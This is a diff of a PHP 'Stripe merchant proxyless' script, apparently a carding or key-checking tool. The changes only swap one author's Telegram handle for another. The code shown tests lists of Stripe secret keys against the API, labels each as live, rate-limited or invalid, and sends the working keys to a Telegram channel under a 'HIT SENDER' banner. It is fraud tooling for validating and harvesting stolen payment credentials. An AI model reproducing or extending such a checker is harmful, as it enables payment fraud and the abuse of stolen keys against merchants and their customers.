@@ -1,7 +1,7 @@
 <?php
 
 
-//===================== [ MADE BY @Always_sahil ] ====================//
+//===================== [ MADE BY @cyberxbd ] ====================//
 #---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
 
 
@@ -108,13 +108,13 @@ if(strpos($result1, 'livemode' )) {
   echo "<br><b>ID: </b> $tok1";
    echo "<br><b>Ammount: </b>$amount";
    echo "<br><b>Currency: </b>$currency<br><br>";
-  send_message($userid, "<b>🟡𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 SK :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : Live Mode </b>\n<b>SK KEY: LIVE Key ✅</b>\n<b>BY ➔ @MotuSamusa</b>");
+  send_message($userid, "<b>🟡𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 SK :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : Live Mode </b>\n<b>SK KEY: LIVE Key ✅</b>\n<b>BY ➔ @CyberXBD</b>");
 }
 elseif(strpos($result1,'rate_limit')){
     echo '|𝘾𝙑𝙑</span>  </span>SK:  '.$sk.'</span>  <br>Result: rate_limit';
    echo "<br><b>Ammount: </b>$amount";
    echo "<br><b>Currency: </b>$currency<br><br>";
-  send_message($userid, "<b>🟡𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 SK :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : ♻Live Mode </b>\n<b>SK KEY: Rate-Limit 🟠 </b>\n<b>BY ➔ @MotuSamusa</b>");
+  send_message($userid, "<b>🟡𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 SK :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : ♻Live Mode </b>\n<b>SK KEY: Rate-Limit 🟠 </b>\n<b>BY ➔ @CyberXBD</b>");
 }
 elseif(strpos($result1, 'Invalid API Key')) {
     echo 'DEAD</span>  </span>Sk:  '.$sk.'</span>  <br>Result: Invalid API Key provided</span><br>';
@@ -139,7 +139,7 @@ elseif(strpos($result1, 'Your account cannot currently make live charges')) {
 }
 
 
-//===================== [ MADE BY Always_Sahil ] ====================//
+//===================== [ MADE ] ====================//
 
 
 //echo "<br><b>Lista:</b> $lista<br>";
